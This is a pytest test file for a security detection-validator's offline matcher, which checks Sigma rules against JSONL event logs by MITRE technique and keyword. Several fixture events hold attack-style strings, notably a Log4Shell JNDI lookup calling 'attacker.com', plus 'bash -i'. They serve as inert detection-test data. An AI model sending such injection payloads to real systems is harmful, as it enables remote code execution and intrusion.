"""
Tests for validator/matcher.py — offline JSONL event matching.

All tests use temporary files written in the test; no network or SIEM needed.
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from detection_validator.normalizer.schema import (
    CanonicalDetection,
    DetectionFormat,
    DetectionLogic,
    MitreTechnique,
    Severity,
)
from detection_validator.validator.matcher import (
    _keyword_tokens,
    _match_one,
    load_events,
    match_corpus,
)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _now_iso() -> str:
    return datetime.now(tz=timezone.utc).isoformat()


def _ago_iso(hours: float) -> str:
    t = datetime.now(tz=timezone.utc) - timedelta(hours=hours)
    return t.isoformat()


def _write_events(path: Path, events: list[dict]) -> None:
    with open(path, "w") as fh:
        for ev in events:
            print(json.dumps(ev), file=fh)


def _make_detection(
    name: str = "Test Rule",
    techniques: list[str] | None = None,
    raw_logic: str = "",
) -> CanonicalDetection:
    techs = []
    for tid in (techniques or []):
        base = tid.split(".")[0]
        sub = tid if "." in tid else None
        techs.append(MitreTechnique(technique_id=base, sub_technique_id=sub,
                                    tactic="execution"))
    return CanonicalDetection(
        name=name,
        description="test",
        detection_logic=DetectionLogic(raw=raw_logic, language="sigma",
                                       normalized_conditions=[], field_references=[]),
        log_sources=[],
        mitre_techniques=techs,
        severity=Severity.MED,
        source_format=DetectionFormat.SIGMA,
    )


# ── Unit: _keyword_tokens ─────────────────────────────────────────────────────

class TestKeywordTokens:

    def test_basic_extraction(self) -> None:
        tokens = _keyword_tokens(["jndi", "exploit", "log4j"])
        assert "jndi" in tokens
        assert "exploit" in tokens
        assert "log4j" in tokens

    def test_strips_wildcards(self) -> None:
        tokens = _keyword_tokens(["*jndi*", "exploit*"])
        assert "jndi" in tokens
        assert "exploit" in tokens

    def test_skips_short_tokens(self) -> None:
        tokens = _keyword_tokens(["id", "ls", "ok", "curl"])
        # "id", "ls", "ok" are < 4 chars; "curl" is exactly 4
        assert "id" not in tokens
        assert "ls" not in tokens
        assert "curl" in tokens

    def test_deduplicates(self) -> None:
        tokens = _keyword_tokens(["jndi", "JNDI", "jndi"])
        assert tokens.count("jndi") == 1

    def test_splits_on_punctuation(self) -> None:
        tokens = _keyword_tokens(["curl:jndi"])
        assert "curl" in tokens
        assert "jndi" in tokens

    def test_empty_input(self) -> None:
        assert _keyword_tokens([]) == []


# ── Unit: _match_one ─────────────────────────────────────────────────────────

class TestMatchOne:

    def test_matches_by_technique_field(self) -> None:
        events = [
            {"technique": "T1190", "cmd_output": "some output"},
            {"technique": "T1059", "cmd_output": "other"},
        ]
        count, samples = _match_one(["T1190"], [], events)
        assert count == 1
        assert samples[0]["technique"] == "T1190"

    def test_matches_base_technique_for_subtechnique(self) -> None:
        # Event has T1059; rule has T1059.004 — base T1059 should match
        events = [{"technique": "T1059", "cmd_output": "bash -i"}]
        count, _ = _match_one(["T1059.004"], [], events)
        assert count == 1

    def test_matches_by_keyword_in_proctitle(self) -> None:
        events = [{"proctitle": "curl jndi:ldap://attacker.com/exploit"}]
        count, _ = _match_one([], ["jndi"], events)
        assert count == 1

    def test_matches_by_keyword_in_cmd_output(self) -> None:
        events = [{"cmd_output": "log4shell exploit detected"}]
        count, _ = _match_one([], ["log4shell"], events)
        assert count == 1

    def test_no_match_when_no_overlap(self) -> None:
        events = [{"technique": "T1046", "cmd_output": "nmap scan"}]
        count, _ = _match_one(["T1190"], ["jndi"], events)
        assert count == 0

    def test_returns_at_most_3_samples(self) -> None:
        events = [{"technique": "T1190"} for _ in range(10)]
        count, samples = _match_one(["T1190"], [], events)
        assert count == 10
        assert len(samples) <= 3

    def test_empty_events(self) -> None:
        count, samples = _match_one(["T1190"], ["jndi"], [])
        assert count == 0
        assert samples == []

    def test_case_insensitive_technique_match(self) -> None:
        events = [{"technique": "t1190"}]
        count, _ = _match_one(["T1190"], [], events)
        assert count == 1

    def test_keyword_not_in_irrelevant_field(self) -> None:
        # "jndi" is only in a field not checked by the matcher
        events = [{"exe": "/usr/bin/jndi-lookup", "technique": "T1046"}]
        count, _ = _match_one(["T1190"], ["jndi"], events)
        # technique doesn't match, and "exe" is not in _FREE_TEXT_FIELDS
        assert count == 0


# ── Unit: load_events ────────────────────────────────────────────────────────

class TestLoadEvents:

    def test_reads_valid_jsonl(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [{"technique": "T1190"}, {"technique": "T1059"}])
        events = load_events(path, since_dt=None)
        assert len(events) == 2

    def test_skips_blank_lines(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        path.write_text('\n{"technique": "T1190"}\n\n{"technique": "T1059"}\n')
        events = load_events(path, since_dt=None)
        assert len(events) == 2

    def test_skips_malformed_lines(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        path.write_text('{"technique": "T1190"}\nnot json\n{"technique": "T1059"}\n')
        events = load_events(path, since_dt=None)
        assert len(events) == 2

    def test_time_filter_excludes_old_events(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _ago_iso(0.25)},  # 15 min ago — within window
            {"technique": "T1059", "timestamp": _ago_iso(48)},    # 2 days ago — excluded
        ])
        cutoff = datetime.now(tz=timezone.utc) - timedelta(hours=1)
        events = load_events(path, since_dt=cutoff)
        assert len(events) == 1
        assert events[0]["technique"] == "T1190"

    def test_no_time_filter_returns_all(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _ago_iso(999)},
        ])
        events = load_events(path, since_dt=None)
        assert len(events) == 1

    def test_accepts_at_timestamp_field(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "@timestamp": _ago_iso(0.1)},
        ])
        cutoff = datetime.now(tz=timezone.utc) - timedelta(hours=1)
        events = load_events(path, since_dt=cutoff)
        assert len(events) == 1


# ── Integration: match_corpus ────────────────────────────────────────────────

class TestMatchCorpus:

    def test_pass_on_technique_hit(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _now_iso()},
        ])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=1)

        assert len(results) == 1
        assert results[0].status == "pass"
        assert results[0].hit_count == 1

    def test_fail_on_no_matching_events(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1046", "timestamp": _now_iso()},
        ])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status == "fail"
        assert results[0].hit_count == 0

    def test_keyword_match_from_detection_logic(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"proctitle": "curl jndi:ldap://attacker.com", "timestamp": _now_iso()},
        ])
        # Detection with no technique but with keyword in raw Sigma logic
        detection = _make_detection(raw_logic="detection:\n  keywords:\n    - jndi")
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status == "pass"

    def test_skip_when_no_techniques_and_no_keywords(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [{"technique": "T1190", "timestamp": _now_iso()}])
        detection = _make_detection()  # no techniques, no raw logic keywords
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status == "skip"

    def test_error_when_file_not_found(self) -> None:
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], Path("/nonexistent/path.jsonl"))

        assert results[0].status == "error"
        assert results[0].error

    def test_multiple_detections(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _now_iso()},
        ])
        d1 = _make_detection(name="Rule A", techniques=["T1190"])
        d2 = _make_detection(name="Rule B", techniques=["T1059"])
        results = match_corpus([d1, d2], path, since_hours=1)

        assert len(results) == 2
        statuses = {r.name: r.status for r in results}
        assert statuses["Rule A"] == "pass"
        assert statuses["Rule B"] == "fail"

    def test_since_hours_zero_matches_all(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _ago_iso(999)},
        ])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=0)

        assert results[0].status == "pass"

    def test_result_siem_is_local(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].siem == "local"

    def test_samples_populated_on_hit(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        ev = {"technique": "T1190", "cmd_output": "exploit output", "timestamp": _now_iso()}
        _write_events(path, [ev])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=1)

        assert len(results[0].sample_events) == 1
        assert results[0].sample_events[0]["technique"] == "T1190"
